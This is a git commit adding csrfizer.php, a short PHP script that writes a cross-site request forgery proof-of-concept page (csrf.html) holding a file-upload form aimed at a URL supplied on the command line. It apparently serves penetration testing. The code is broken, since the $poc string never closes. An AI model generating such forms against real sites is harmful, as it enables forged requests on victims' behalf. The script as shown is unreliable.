3575a1f1daf4b9ce8f14560a4628a1c04483539e
b3rksecurity <44809204+b3rksecurity@users.noreply.github.com>
2019-06-07 15:01:19 +0200

    Create csrfizer.php

---
+++ csrfizer.php
@@ -0,0 +1,10 @@
+
+<?php
+# by b3rksecurity
+echo "USAGE: php $argv[0] http://url/csrf-path eg: files[]..";
+$url = $argv[1];
+$postfile = $argv[2];
+$poc = "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$postfile'><input type='submit' name='go' value='upload'></form>
+echo "PoC Created! Check the csrf.html file";
+fwrite(fopen("csrf.html", "a+"), "$poc");
+?>
